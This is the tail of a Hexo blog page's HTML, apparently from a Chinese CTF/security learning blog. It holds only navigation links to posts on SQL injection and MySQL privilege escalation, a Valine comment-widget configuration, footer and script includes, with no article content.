src="https://img.xpctf.cn/img/20200530144523.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入学习笔记2</div></div></a></div><div class="next-post pull_right"><a href="/posts/295e/"><img class="next_cover" src="https://img.xpctf.cn/img/20200612164000.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux国内更新源-通用</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/posts/2c54/" title="MySQL数据库提权"><img class="relatedPosts_cover" src="https://img.xpctf.cn/img/20200722105009.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-07-22</div><div class="relatedPosts_title">MySQL数据库提权</div></div></a></div><div class="relatedPosts_item"><a href="/posts/d106/" title="SQL注入学习笔记2"><img class="relatedPosts_cover" src="https://img.xpctf.cn/img/20200530144523.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-07-01</div><div class="relatedPosts_title">SQL注入学习笔记2</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var requestSetting = function (from,set) {
  var from = from
  var setting = set.split(',').filter(function(item){
  return from.indexOf(item) > -1
  });
  setting = setting.length == 0 ? from :setting;
  return setting
}

var guestInfo = requestSetting(['nick','mail','link'],'nick,mail,link')
var requiredFields = requestSetting(['nick','mail','link'],'nick,mail')

window.valine = new Valine({
  el:'#vcomment',
  appId: 'adT2HesNUqwHDh4xp5GslrsX-gzGzoHsz',
  appKey: 'Mq44asxphpP9OIUwp6gCCOA7',
  notify: false,
  verify: true,
  placeholder: '(͒˶´⚇`˵)͒  快来留下你的小脚印吧~~',
  avatar: 'monsterid',
  meta: guestInfo,
  pageSize: '10',
  lang: 'zh-CN',
  recordIP: true,
  serverURLs: '',
  emojiCDN: '',
  emojiMaps: "",
  enableQQ: true,
  requiredFields: requiredFields
});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By XiaoPu</div><div class="framework-info"><span>驱动 </span><a target="_blank" rel="noopener" href="https://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="sitemap"><a href="/sitemap.xml"><span>Google地图</span></a><span class="footer-separator">|</span><a href="/baidusitemap.xml"><span>Baidu地图</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/js/search/local-search.js"></script><script src="/live2d-widget/autoload.js"></script></body></html>